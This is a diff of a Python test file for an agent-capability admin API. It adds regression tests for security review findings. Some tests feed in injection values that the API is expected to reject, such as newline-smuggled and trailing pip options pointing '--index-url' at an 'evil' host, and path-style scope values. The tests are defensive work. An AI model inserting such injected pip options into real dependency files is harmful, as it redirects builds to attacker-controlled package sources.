@@ -61,7 +61,9 @@ def _load_store():
 
 
 def _load_admin():
-    for m in ("admin", "config_store", "auth", "http_responses"):
+    # skill_store reads SKILLS_BUCKET at import — pop it too so a test that sets
+    # the env var gets a binding to its own bucket, not a stale cached one.
+    for m in ("admin", "config_store", "auth", "http_responses", "skill_store"):
         sys.modules.pop(m, None)
     # Default to no build pipeline so a test that doesn't stub CodeBuild leaves a
     # capability pending rather than reaching for a real StartBuild. Tests that
@@ -606,8 +608,10 @@ def test_delete_builtin_route_returns_409():
 
 @mock_aws
 def test_builtin_onboard_honors_only_enabled_not_config(monkeypatch):
-    """A submit against a built-in ignores config fields — only enable/disable
-    applies. Enabling a built-in starts a build like any enable."""
+    """A submit against a built-in accepts ONLY enable/disable; any other
+    declarative field is rejected with 400 (spec §8.2 — "rejects any change
+    except enabled"), never silently ignored. Enabling a built-in starts a
+    build like any enable."""
     _make_table()
     admin = _load_admin()
     cs = _load_store()
@@ -617,24 +621,35 @@ def test_builtin_onboard_honors_only_enabled_not_config(monkeypatch):
         "workitems", description="PO/PM", aliases=["pm"], builtin=True, enabled=False,
         status=cs.CAP_DISABLED,
     )
+    # A body carrying config fields is REJECTED (400), config untouched.
     resp = admin.handler(
         _event(
             "POST", "/admin/capabilities",
             body={
                 "agent_id": "workitems",
                 "enabled": True,
-                # These MUST be ignored for a built-in:
                 "description": "HIJACKED",
                 "aliases": ["evil"],
                 "env": {"FOO": "bar"},
             },
         )
     )
-    assert resp["statusCode"] == 200, resp["body"]
+    assert resp["statusCode"] == 400, resp["body"]
     row = cs.get_capability("workitems")
     assert row["description"] == "PO/PM"  # seeded config preserved
     assert row["aliases"] == ["pm"]
     assert row["env"] == {}
+    assert row["enabled"] is False  # toggle NOT applied on a rejected body
+    assert builds == []
+    # A pure toggle body succeeds and starts a build.
+    resp = admin.handler(
+        _event("POST", "/admin/capabilities",
+               body={"agent_id": "workitems", "enabled": True})
+    )
+    assert resp["statusCode"] == 200, resp["body"]
+    row = cs.get_capability("workitems")
+    assert row["enabled"] is True
+    assert row["description"] == "PO/PM"
     assert row["builtin"] is True
     assert len(builds) == 1  # enabling built-in still builds
 
@@ -1036,7 +1051,7 @@ def test_onboard_persists_skills_and_gates_on_novel_skill(monkeypatch):
     monkeypatch.setenv("REQUIRE_AGENT_APPROVAL", "true")
     _stub_codebuild(admin, monkeypatch, [])
     skill = {"name": "triage-playbook", "s3_prefix": "skills/shared/triage-playbook/",
-             "sha256": "abc123", "scope": "shared"}
+             "sha256": "a" * 64, "scope": "shared"}
     resp = admin.handler(_event("POST", "/admin/capabilities", body={
         "agent_id": "triage", "skills": [skill], "enabled": True,
     }))
@@ -1075,3 +1090,309 @@ def test_system_prompt_can_be_cleared_and_preserved():
     # ...but an explicit empty string clears it (was impossible with `or`).
     cs.put_capability("triage", system_prompt="")
     assert cs.get_capability("triage")["system_prompt"] == ""
+
+
+# --- review-finding regressions ------------------------------------------------
+
+
+@mock_aws
+def test_clone_with_deps_parks_pending_review_when_gate_on(monkeypatch):
+    """Finding 1: a clone copies the source's requirements/skills into a NEW row
+    whose review_status would default 'approved' — a later edit+enable would then
+    compute zero novelty against that copied baseline and skip the second-admin
+    gate. With the gate on, a dep/skill-carrying clone must be born
+    pending_review."""
+    _make_table()
+    admin = _load_admin()
+    cs = _load_store()
+    monkeypatch.setenv("REQUIRE_AGENT_APPROVAL", "true")
+    cs.put_capability(
+        "workitems", builtin=True, requirements=["tavily-python>=0.5"],
+    )
+    resp = admin.handler(_event(
+        "POST", "/admin/capabilities/{agent_id}/clone",
+        path={"agent_id": "workitems"}, body={"new_agent_id": "my-pm"},
+    ))
+    assert resp["statusCode"] == 200, resp["body"]
+    row = cs.get_capability("my-pm")
+    assert row["review_status"] == "pending_review"
+    # A dep-free clone stays approved (matches the onboard path for a new
+    # agent with no deps/skills).
+    cs.put_capability("adr", builtin=True)
+    resp = admin.handler(_event(
+        "POST", "/admin/capabilities/{agent_id}/clone",
+        path={"agent_id": "adr"}, body={"new_agent_id": "my-adr"},
+    ))
+    assert resp["statusCode"] == 200, resp["body"]
+    assert cs.get_capability("my-adr")["review_status"] == "approved"
+
+
+@mock_aws
+def test_clone_with_deps_gate_off_stays_approved(monkeypatch):
+    _make_table()
+    admin = _load_admin()
+    cs = _load_store()
+    monkeypatch.setenv("REQUIRE_AGENT_APPROVAL", "false")
+    cs.put_capability("workitems", builtin=True, requirements=["requests>=2"])
+    resp = admin.handler(_event(
+        "POST", "/admin/capabilities/{agent_id}/clone",
+        path={"agent_id": "workitems"}, body={"new_agent_id": "my-pm"},
+    ))
+    assert resp["statusCode"] == 200, resp["body"]
+    assert cs.get_capability("my-pm")["review_status"] == "approved"
+
+
+@mock_aws
+def test_onboard_rejects_requirement_with_control_chars(monkeypatch):
+    """Finding 0: a newline inside one 'requirement' would emit a second physical
+    line into requirements-extra.txt that pip parses as a global option."""
+    _make_table()
+    admin = _load_admin()
+    _stub_codebuild(admin, monkeypatch, [])
+    for bad in ["requests\n--index-url http://evil.com",
+                "requests\r\n-e .",
+                "requests\t>=2.31"]:
+        resp = admin.handler(_event("POST", "/admin/capabilities", body={
+            "agent_id": "triage", "requirements": [bad],
+        }))
+        assert resp["statusCode"] == 400, f"should reject: {bad!r}"
+    # PEP 508 internal spaces are accepted at the boundary AND by the build-side
+    # validator (finding 5 parity — see test_requirements_parity.py).
+    resp = admin.handler(_event("POST", "/admin/capabilities", body={
+        "agent_id": "triage", "requirements": ["requests >= 2.31"],
+    }))
+    assert resp["statusCode"] == 200, resp["body"]
+
+
+@mock_aws
+def test_onboard_rejects_reserved_skill_env_keys(monkeypatch):
+    """Finding 6: SKILLS_BUCKET / SKILLS_MANIFEST are deployer-derived skill-
+    delivery values — an authored env must not shadow them."""
+    _make_table()
+    admin = _load_admin()
+    _stub_codebuild(admin, monkeypatch, [])
+    for key in ("SKILLS_BUCKET", "SKILLS_MANIFEST"):
+        resp = admin.handler(_event("POST", "/admin/capabilities", body={
+            "agent_id": "triage", "env": {key: "evil"},
+        }))
+        assert resp["statusCode"] == 400, f"should reject env.{key}"
+
+
+@mock_aws
+def test_skill_upload_rejects_invalid_scope(monkeypatch):
+    """Finding 8: scope flows into the S3 key prefix — allowlisted at the API."""
+    _make_table()
+    monkeypatch.setenv("SKILLS_BUCKET", "sdlc-agent-skills-test")
+    admin = _load_admin()
+    resp = admin.handler(_event("POST", "/admin/skills", body={
+        "content": "---\nname: x\ndescription: d\n---\n", "scope": "shared/evil",
+    }))
+    assert resp["statusCode"] == 400
+    assert "scope" in json.loads(resp["body"])["error"]
+
+
+@mock_aws
+def test_skill_delete_rejects_invalid_scope_or_name(monkeypatch):
+    _make_table()
+    monkeypatch.setenv("SKILLS_BUCKET", "sdlc-agent-skills-test")
+    admin = _load_admin()
+    resp = admin.handler(_event("DELETE", "/admin/skills/{key+}",
+                                path={"key+": "_staging/whatever"}))
+    assert resp["statusCode"] == 400
+    resp = admin.handler(_event("DELETE", "/admin/skills/{key+}",
+                                path={"key+": "shared/Bad Name!"}))
+    assert resp["statusCode"] == 400
+
+
+@mock_aws
+def test_onboard_rejects_skill_without_sha_or_noncanonical_prefix(monkeypatch):
+    """Finding 3 (API side): an attached skill must carry its 64-hex sha256 and
+    its canonical skills/<scope>/<name>/ prefix — otherwise the base agent's
+    startup integrity check is silently skipped or points at a foreign tree."""
+    _make_table()
+    admin = _load_admin()
+    _stub_codebuild(admin, monkeypatch, [])
+    base = {"name": "pb", "scope": "shared", "s3_prefix": "skills/shared/pb/",
+            "sha256": "a" * 64}
+    for mutation in (
+        {"sha256": ""},                              # missing hash
+        {"sha256": "abc123"},                        # not 64 hex
+        {"s3_prefix": "_staging/x/"},                # non-canonical prefix
+        {"s3_prefix": "skills/shared/other/"},       # someone else's tree
+        {"scope": "custom"},                         # unknown scope
+        {"name": "Bad Name!"},                       # invalid name
+    ):
+        skill = {**base, **mutation}
+        resp = admin.handler(_event("POST", "/admin/capabilities", body={
+            "agent_id": "triage", "skills": [skill],
+        }))
+        assert resp["statusCode"] == 400, f"should reject skill={mutation!r}"
+
+
+@mock_aws
+def test_plugins_field_reserved_and_rejected(monkeypatch):
+    """Spec §6.4: capability.plugins is a reserved schema seam — the API rejects
+    it (400) until the marketplace-install runtime lands, rather than silently
+    dropping it."""
+    _make_table()
+    admin = _load_admin()
+    _stub_codebuild(admin, monkeypatch, [])
+    resp = admin.handler(_event("POST", "/admin/capabilities", body={
+        "agent_id": "triage", "plugins": ["anthropics/skills"],
+    }))
+    assert resp["statusCode"] == 400
+    assert "reserved" in json.loads(resp["body"])["error"]
+
+
+@mock_aws
+def test_capability_changes_trigger_policy_sync(monkeypatch):
+    """Spec §3.5: a capability create/edit, approve, disable, and delete must
+    each push the per-agent tool permits to the Gateway policy engine — not wait
+    for the next unrelated repo/settings change. (The sync itself no-ops without
+    POLICY_ENGINE_ID; here we assert the seam is invoked.)"""
+    _make_table()
+    admin = _load_admin()
+    cs = _load_store()
+    _stub_codebuild(admin, monkeypatch, [])
+    monkeypatch.setenv("REQUIRE_AGENT_APPROVAL", "false")
+    syncs: list = []
+    monkeypatch.setattr(admin, "_sync_repo_policy", lambda: syncs.append(1))
+
+    # Create/edit (enabled) syncs.
+    resp = admin.handler(_event("POST", "/admin/capabilities", body={
+        "agent_id": "triage", "enabled": True,
+    }))
+    assert resp["statusCode"] == 200, resp["body"]
+    assert len(syncs) == 1
+
+    # Disable syncs (retracts the permit).
+    resp = admin.handler(_event("POST", "/admin/capabilities", body={
+        "agent_id": "triage", "enabled": False,
+    }))
+    assert resp["statusCode"] == 200, resp["body"]
+    assert len(syncs) == 2
+
+    # Approve syncs before the build starts.
+    monkeypatch.setenv("REQUIRE_AGENT_APPROVAL", "true")
+    cs.put_capability("pending-one", requirements=["requests"], onboarded_by="admin-1")
+    cs.set_review_status("pending-one", "pending_review")
+    resp = admin.handler(_event(
+        "POST", "/admin/capabilities/{agent_id}/approve",
+        claims=ADMIN2, path={"agent_id": "pending-one"},
+    ))
+    assert resp["statusCode"] == 200, resp["body"]
+    assert len(syncs) == 3
+
+    # Delete syncs (retracts the permit at de-route time).
+    monkeypatch.setenv("CAPABILITY_DEPLOYER_FUNCTION", "capability-deployer-test")
+    invoked: list = []
+    class _FakeLambda:
+        def invoke(self, **kw):
+            invoked.append(kw)
+            return {}
+    import boto3 as _b
+    real = _b.client
+    monkeypatch.setattr(_b, "client",
+                        lambda n, *a, **k: _FakeLambda() if n == "lambda" else real(n, *a, **k))
+    resp = admin.handler(_event(
+        "DELETE", "/admin/capabilities/{agent_id}", path={"agent_id": "pending-one"},
+    ))
+    assert resp["statusCode"] == 200, resp["body"]
+    assert len(syncs) == 4
+    assert len(invoked) == 1
+
+
+@mock_aws
+def test_approve_rolls_back_to_pending_on_policy_sync_failure(monkeypatch):
+    """If the permit sync fails while the gateway is ENFORCING, the approval is
+    rolled back to pending_review so the approve can be retried (a row left
+    'approved' would 409 the retry)."""
+    _make_table()
+    admin = _load_admin()
+    cs = _load_store()
+    _stub_codebuild(admin, monkeypatch, [])
+    monkeypatch.setenv("REQUIRE_AGENT_APPROVAL", "true")
+    monkeypatch.setenv("GATEWAY_ENFORCEMENT", "ACTIVE")
+    def _boom():
+        raise admin.PolicySyncError("engine down")
+    monkeypatch.setattr(admin, "_sync_repo_policy", _boom)
+    cs.put_capability("pending-one", requirements=["requests"], onboarded_by="admin-1")
+    cs.set_review_status("pending-one", "pending_review")
+    resp = admin.handler(_event(
+        "POST", "/admin/capabilities/{agent_id}/approve",
+        claims=ADMIN2, path={"agent_id": "pending-one"},
+    ))
+    assert resp["statusCode"] == 502
+    assert cs.get_capability("pending-one")["review_status"] == "pending_review"
+
+
+@mock_aws
+def test_sparse_toggle_preserves_custom_config(monkeypatch):
+    """The UI's Enable/Disable toggle sends exactly {agent_id, enabled}; it must
+    NOT clear the custom agent's authored prompt/deps/grants/skills (which would
+    also empty the approval-gate novelty baseline)."""
+    _make_table()
+    admin = _load_admin()
+    cs = _load_store()
+    _stub_codebuild(admin, monkeypatch, [])
+    monkeypatch.setenv("REQUIRE_AGENT_APPROVAL", "false")
+    resp = admin.handler(_event("POST", "/admin/capabilities", body={
+        "agent_id": "triage",
+        "system_prompt": "You are a triage bot.",
+        "requirements": ["requests>=2.31"],
+        "tool_grants": ["GitHubTarget___get_issue"],
+        "enabled": True,
+    }))
+    assert resp["statusCode"] == 200, resp["body"]
+    # Toggle off with a sparse body — config must survive.
+    resp = admin.handler(_event("POST", "/admin/capabilities", body={
+        "agent_id": "triage", "enabled": False,
+    }))
+    assert resp["statusCode"] == 200, resp["body"]
+    row = cs.get_capability("triage")
+    assert row["system_prompt"] == "You are a triage bot."
+    assert row["requirements"] == ["requests>=2.31"]
+    assert row["tool_grants"] == ["GitHubTarget___get_issue"]
+    # An explicit empty value is still a deliberate clear.
+    resp = admin.handler(_event("POST", "/admin/capabilities", body={
+        "agent_id": "triage", "requirements": [], "enabled": False,
+    }))
+    assert resp["statusCode"] == 200, resp["body"]
+    assert cs.get_capability("triage")["requirements"] == []
+
+
+@mock_aws
+def test_onboard_rejects_per_requirement_pip_options(monkeypatch):
+    """'pkg>=1 --hash=…' style per-requirement options must be rejected — pip
+    parses the trailing token as an option, feeding attacker-chosen args into
+    the build (§7.1)."""
+    _make_table()
+    admin = _load_admin()
+    _stub_codebuild(admin, monkeypatch, [])
+    for bad in ["somepkg>=0 --hash=sha256:aaaa",
+                "somepkg>=0 --config-settings=--build-option=x",
+                "somepkg --index-url http://evil"]:
+        resp = admin.handler(_event("POST", "/admin/capabilities", body={
+            "agent_id": "triage", "requirements": [bad],
+        }))
+        assert resp["statusCode"] == 400, f"should reject: {bad!r}"
+
+
+@mock_aws
+def test_onboard_rejects_duplicate_skill_names_across_scopes(monkeypatch):
+    """shared/pb and capability/pb would overlay into one SKILLS_DIR/pb at
+    runtime — one skill per name per agent."""
+    _make_table()
+    admin = _load_admin()
+    _stub_codebuild(admin, monkeypatch, [])
+    resp = admin.handler(_event("POST", "/admin/capabilities", body={
+        "agent_id": "triage",
+        "skills": [
+            {"name": "pb", "scope": "shared", "s3_prefix": "skills/shared/pb/",
+             "sha256": "a" * 64},
+            {"name": "pb", "scope": "capability", "s3_prefix": "skills/capability/pb/",
+             "sha256": "b" * 64},
+        ],
+    }))
+    assert resp["statusCode"] == 400
+    assert "more than once" in json.loads(resp["body"])["error"]
